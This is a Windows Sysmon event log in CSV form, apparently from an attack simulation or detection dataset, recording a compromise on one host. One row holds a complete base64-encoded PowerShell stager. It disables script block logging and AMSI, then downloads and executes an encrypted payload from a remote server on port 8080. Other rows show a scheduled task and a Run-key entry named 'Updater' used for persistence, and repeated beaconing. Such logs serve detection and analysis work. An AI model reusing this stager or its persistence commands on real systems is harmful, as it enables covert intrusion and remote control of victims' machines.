,UtcTime,ProcessId,EventID,User,Image,ImageLoaded,CommandLine,ParentImage,ParentCommandLine,DestinationPort,Protocol,QueryName,TargetFilename,TargetObject
2321,2020-05-12 14:56:27.318,10280,1,DESKTOP-TATBGQH\anon,C:\Windows\System32\schtasks.exe,,"""C:\Windows\system32\schtasks.exe"" /Create /F /RU system /SC DAILY /ST 09:00 /TN Updater /TR ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoP -NonI -W Hidden -enc SQBmACgAJABQAFMAVgBFAFIAcwBJAE8ATgBUAGEAQgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAcwBTAEUAbQBCAEwAeQAuAEcARQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEATAB1AGUAKAAkAG4AVQBMAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAQQBsAD0AWwBDAG8AbABsAGUAQwB0AGkAbwBuAHMALgBHAGUATgBFAFIASQBjAC4ARABJAGMAVABJAE8AbgBhAHIAWQBbAFMAVABSAGkAbgBnACwAUwB5AFMAVABFAG0ALgBPAEIAagBlAGMAdABdAF0AOgA6AG4ARQB3ACgAKQA7ACQAdgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEATAB9AEUATABTAEUAewBbAFMAQwBSAEkAcAB0AEIATABvAEMAawBdAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAVQBlACgAJABOAFUATABMACwAKABOAEUAVwAtAE8AQgBqAGUAQwBUACAAQwBvAGwAbABFAEMAVABpAE8AbgBTAC4ARwBlAG4AZQBSAEkAQwAuAEgAQQBzAEgAUwBFAHQAWwBzAHQAUgBJAE4AZwBdACkAKQB9AFsAUgBlAEYAXQAuAEEAUwBTAEUAbQBiAGwAeQAuAEcARQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBlAFQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAGEAbAB1AEUAKAAkAE4AVQBsAEwALAAkAFQAcgBVAGUAKQB9ADsAfQA7AFsAUwBZAFMAdABlAG0ALgBOAEUAVAAuAFMAZQBSAFYASQBjAEUAUABvAGkAbgB0AE0AYQBOAEEAZwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAE4AVABpAE4AdQBlAD0AMAA7ACQAdwBjAD0ATgBFAFcALQBPAGIASgBlAGMAVAAgAFMAeQBTAFQAZQBtAC4ATgBlAFQALgBXAGUAYgBDAGwAaQBlAG4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAEgAZQBhAGQARQBSAHMALgBBAEQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAUgBPAFgAeQA9AFsAUwB5AHMAVABlAG0ALgBOAEUAdAAuAFcARQBiAFIAZQBRAHUARQBzAFQAXQA6ADoARABlAGYAQQB1AGwAdABXAEUAQgBQAFIATwB4AHkAOwAkAFcAYwAuAFAAUgBvAFgAeQAuAEMAUgBlAGQAZQBOAFQASQBBAEwAcwAgAD0AIABbAFMAeQBzAFQARQBtAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAGkAQQBMAEMAQQBDAGgAZQBdADoAOgBEAGUAZgBhAHUATABUAE4ARQBUAHcATwBSAEsAQwByAEUAZABFAE4AdABpAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAdABlAE0ALgBUAEUAWABUAC4ARQBOAGMAbwBEAGkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAWQB0AGUAUwAoACcARAAqADEAQQA1ADsASwBmAHQAXgB7AHMASgA4AGwAQABSAF8APABaAG4ASQBkADcAPgB+AEIANgBFAFMAbwBlACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMgA0AC4AMQAzADUAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAHcAQwAuAEgAZQBhAGQAZQBSAFMALgBBAEQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AFMATQBMAFgAVwBRAGIAaQBFADMAWgAvAE4ARABHAHEATAB1ADgAVAA5AEUAdABCAHIARABRAD0AIgApADsAJABEAEEAdABhAD0AJABXAEMALgBEAE8AVwBuAGwAbwBBAEQARABhAFQAQQAoACQAUwBFAHIAKwAkAHQAKQA7ACQASQBWAD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABkAGEAdABBAD0AJABkAEEAdABBAFsANAAuAC4AJABkAEEAVABhAC4AbABFAE4AZwB0AEgAXQA7AC0AagBvAGkAbgBbAEMAaABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAVABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=",,,,,
2322,2020-05-12 14:56:22.233,1520,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2323,2020-05-12 14:56:17.206,1520,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2324,2020-05-12 14:56:12.158,1520,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2327,2020-05-12 14:56:07.110,1520,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2328,2020-05-12 14:56:02.083,1520,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2329,2020-05-12 14:55:57.055,1520,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2330,2020-05-12 14:55:52.030,1520,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2333,2020-05-12 14:55:50.199,9092,11,,C:\Program Files (x86)\F-Secure\PSB\Ultralight\ulcore\1585820217\fshoster64.exe,,,,,,,,C:\ProgramData\F-Secure\Log\FSAV\fa.log,
2334,2020-05-12 14:55:47.005,1520,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2335,2020-05-12 14:55:41.983,1520,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2336,2020-05-12 14:55:39.621,6928,3,NT AUTHORITY\NETWORK SERVICE,C:\Program Files (x86)\F-Secure\PSB\Ultralight\sensor\1585128330\fsatpn.exe,,,,,443,tcp,,,
2337,2020-05-12 14:55:40.062,9728,22,,C:\Program Files (x86)\F-Secure\PSB\Ultralight\sensor\1585128330\fsatps.exe,,,,,,,obus.sc.fsapi.com,,
2338,2020-05-12 14:55:39.571,6928,22,,C:\Program Files (x86)\F-Secure\PSB\Ultralight\sensor\1585128330\fsatpn.exe,,,,,,,obus.sc.fsapi.com,,
2339,2020-05-12 14:55:36.908,1520,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2340,2020-05-12 14:55:36.734,1520,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2341,2020-05-12 14:55:36.933,1520,7,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\diasymreader.dll,,,,,,,,
2342,2020-05-12 14:55:36.855,1520,13,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater
2343,2020-05-12 14:55:31.702,1520,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2344,2020-05-12 14:55:26.686,1520,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2345,2020-05-12 14:55:21.656,1520,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2346,2020-05-12 14:55:22.527,1936,11,,C:\Windows\system32\svchost.exe,,,,,,,,C:\Windows\Prefetch\SVCHOST.EXE-BFF367D9.pf,
2347,2020-05-12 14:55:22.433,1936,11,,C:\Windows\system32\svchost.exe,,,,,,,,C:\Windows\Prefetch\SVCHOST.EXE-FF256082.pf,
2349,2020-05-12 14:55:16.626,1520,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2351,2020-05-12 14:55:11.599,1520,3,DESKTOP-TATBGQH\anon,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,8080,tcp,,,
2352,2020-05-12 14:55:12.512,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\taskschd.dll,,,,,,,,
2353,2020-05-12 14:55:12.543,1936,11,,C:\Windows\system32\svchost.exe,,,,,,,,C:\Windows\Prefetch\TASKHOSTW.EXE-2E5D4B75.pf,
2354,2020-05-12 14:55:12.496,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\DdcComImplementationsDesktop.dll,,,,,,,,
2356,2020-05-12 14:55:12.527,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\dpapi.dll,,,,,,,,
2357,2020-05-12 14:55:12.527,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\netutils.dll,,,,,,,,
2358,2020-05-12 14:55:12.527,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\samcli.dll,,,,,,,,
2359,2020-05-12 14:55:12.527,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\NgcCtnr.dll,,,,,,,,
2360,2020-05-12 14:55:12.496,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\wlidprov.dll,,,,,,,,
2361,2020-05-12 14:55:12.512,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\clbcatq.dll,,,,,,,,
2362,2020-05-12 14:55:12.512,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\ktmw32.dll,,,,,,,,
2363,2020-05-12 14:55:12.512,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\NgcCtnrGidsHandler.dll,,,,,,,,
2364,2020-05-12 14:55:12.512,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\sspicli.dll,,,,,,,,
2365,2020-05-12 14:55:12.512,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\imagehlp.dll,,,,,,,,
2366,2020-05-12 14:55:12.496,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\bcrypt.dll,,,,,,,,
2367,2020-05-12 14:55:12.496,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\tbs.dll,,,,,,,,
2368,2020-05-12 14:55:12.465,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\IDStore.dll,,,,,,,,
2369,2020-05-12 14:55:12.496,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\wintrust.dll,,,,,,,,
2370,2020-05-12 14:55:12.496,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\msasn1.dll,,,,,,,,
2371,2020-05-12 14:55:12.496,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\crypt32.dll,,,,,,,,
2372,2020-05-12 14:55:12.496,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\wldp.dll,,,,,,,,
2373,2020-05-12 14:55:12.496,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\profapi.dll,,,,,,,,
2374,2020-05-12 14:55:12.496,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\NgcCtnrSvc.dll,,,,,,,,
2375,2020-05-12 14:55:12.465,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\npmproxy.dll,,,,,,,,
2376,2020-05-12 14:55:12.480,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\samlib.dll,,,,,,,,
2377,2020-05-12 14:55:12.480,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\msvcp_win.dll,,,,,,,,
2378,2020-05-12 14:55:12.465,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\gdi32full.dll,,,,,,,,
2379,2020-05-12 14:55:12.465,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\gdi32.dll,,,,,,,,
2380,2020-05-12 14:55:12.465,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\win32u.dll,,,,,,,,
2381,2020-05-12 14:55:12.449,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\netprofm.dll,,,,,,,,
2382,2020-05-12 14:55:12.465,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\user32.dll,,,,,,,,
2383,2020-05-12 14:55:12.465,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\msvcrt.dll,,,,,,,,
2384,2020-05-12 14:55:12.465,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\kernel.appcore.dll,,,,,,,,
2385,2020-05-12 14:55:12.465,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\bcryptprimitives.dll,,,,,,,,
2386,2020-05-12 14:55:12.465,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\combase.dll,,,,,,,,
2387,2020-05-12 14:55:12.465,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\ucrtbase.dll,,,,,,,,
2388,2020-05-12 14:55:12.465,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\rpcrt4.dll,,,,,,,,
2389,2020-05-12 14:55:12.465,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\sechost.dll,,,,,,,,
2390,2020-05-12 14:55:12.465,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\KernelBase.dll,,,,,,,,
2391,2020-05-12 14:55:12.449,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\kernel32.dll,,,,,,,,
2392,2020-05-12 14:55:12.449,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\ntdll.dll,,,,,,,,
2393,2020-05-12 14:55:12.449,2524,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe,,,,,,,,
2394,2020-05-12 14:55:12.453,2524,1,NT AUTHORITY\LOCAL SERVICE,C:\Windows\System32\svchost.exe,,C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s NgcCtnrSvc,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,,,,,
2395,2020-05-12 14:55:12.449,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\cryptbase.dll,,,,,,,,
2396,2020-05-12 14:55:12.449,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\bcrypt.dll,,,,,,,,
2397,2020-05-12 14:55:12.449,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\rsaenh.dll,,,,,,,,
2398,2020-05-12 14:55:12.433,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\imagehlp.dll,,,,,,,,
2399,2020-05-12 14:55:12.433,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\tbs.dll,,,,,,,,
2400,2020-05-12 14:55:12.418,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\winsta.dll,,,,,,,,
2401,2020-05-12 14:55:12.418,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\wtsapi32.dll,,,,,,,,
2402,2020-05-12 14:55:12.418,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\usermgrcli.dll,,,,,,,,
2403,2020-05-12 14:55:12.418,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\wintrust.dll,,,,,,,,
2404,2020-05-12 14:55:12.418,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\wldp.dll,,,,,,,,
2405,2020-05-12 14:55:12.402,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\ntasn1.dll,,,,,,,,
2406,2020-05-12 14:55:12.402,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\ntmarta.dll,,,,,,,,
2407,2020-05-12 14:55:12.402,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\netutils.dll,,,,,,,,
2408,2020-05-12 14:55:12.402,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\sspicli.dll,,,,,,,,
2409,2020-05-12 14:55:12.402,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\profapi.dll,,,,,,,,
2410,2020-05-12 14:55:12.402,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\ncrypt.dll,,,,,,,,
2411,2020-05-12 14:55:12.402,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\msasn1.dll,,,,,,,,
2412,2020-05-12 14:55:12.402,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\crypt32.dll,,,,,,,,
2413,2020-05-12 14:55:12.402,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\bcrypt.dll,,,,,,,,
2414,2020-05-12 14:55:12.402,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\authz.dll,,,,,,,,
2415,2020-05-12 14:55:12.402,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\advapi32.dll,,,,,,,,
2416,2020-05-12 14:55:12.402,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\ngcsvc.dll,,,,,,,,
2417,2020-05-12 14:55:12.386,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\msvcp_win.dll,,,,,,,,
2418,2020-05-12 14:55:12.371,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\gdi32full.dll,,,,,,,,
2419,2020-05-12 14:55:12.371,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\gdi32.dll,,,,,,,,
2420,2020-05-12 14:55:12.371,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\win32u.dll,,,,,,,,
2421,2020-05-12 14:55:12.371,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\user32.dll,,,,,,,,
2422,2020-05-12 14:55:12.371,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\msvcrt.dll,,,,,,,,
2423,2020-05-12 14:55:12.371,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\kernel.appcore.dll,,,,,,,,
2424,2020-05-12 14:55:12.371,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\bcryptprimitives.dll,,,,,,,,
2425,2020-05-12 14:55:12.371,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\combase.dll,,,,,,,,
2426,2020-05-12 14:55:12.371,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\ucrtbase.dll,,,,,,,,
2427,2020-05-12 14:55:12.371,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\rpcrt4.dll,,,,,,,,
2428,2020-05-12 14:55:12.371,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\sechost.dll,,,,,,,,
2429,2020-05-12 14:55:12.371,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\KernelBase.dll,,,,,,,,
2430,2020-05-12 14:55:12.355,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\kernel32.dll,,,,,,,,
2431,2020-05-12 14:55:12.355,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\ntdll.dll,,,,,,,,
2432,2020-05-12 14:55:12.355,5832,7,,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe,,,,,,,,
2433,2020-05-12 14:55:12.360,5832,1,NT AUTHORITY\SYSTEM,C:\Windows\System32\svchost.exe,,C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s NgcSvc,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,,,,,
2434,2020-05-12 14:55:12.324,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\SecurityHealthProxyStub.dll,,,,,,,,
2435,2020-05-12 14:55:12.324,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\ole32.dll,,,,,,,,
2436,2020-05-12 14:55:12.277,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\samcli.dll,,,,,,,,
2437,2020-05-12 14:55:12.277,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\MdmCommon.dll,,,,,,,,
2438,2020-05-12 14:55:12.293,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\iertutil.dll,,,,,,,,
2439,2020-05-12 14:55:12.293,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\Windows.Web.dll,,,,,,,,
2440,2020-05-12 14:55:12.277,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\msvcp110_win.dll,,,,,,,,
2441,2020-05-12 14:55:12.277,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\advapi32.dll,,,,,,,,
2442,2020-05-12 14:55:12.277,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\policymanager.dll,,,,,,,,
2443,2020-05-12 14:55:12.277,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\rmclient.dll,,,,,,,,
2444,2020-05-12 14:55:12.261,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\DeviceDirectoryClient.dll,,,,,,,,
2445,2020-05-12 14:55:12.277,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\winhttp.dll,,,,,,,,
2446,2020-05-12 14:55:12.277,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\netutils.dll,,,,,,,,
2447,2020-05-12 14:55:12.277,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\propsys.dll,,,,,,,,
2448,2020-05-12 14:55:12.277,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\msasn1.dll,,,,,,,,
2449,2020-05-12 14:55:12.277,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\crypt32.dll,,,,,,,,
2450,2020-05-12 14:55:12.277,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\cryptsp.dll,,,,,,,,
2451,2020-05-12 14:55:12.261,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\powrprof.dll,,,,,,,,
2452,2020-05-12 14:55:12.261,2892,7,,C:\Windows\System32\taskhostw.exe,C:\Windows\System32\SHCore.dll,,,,,,,,
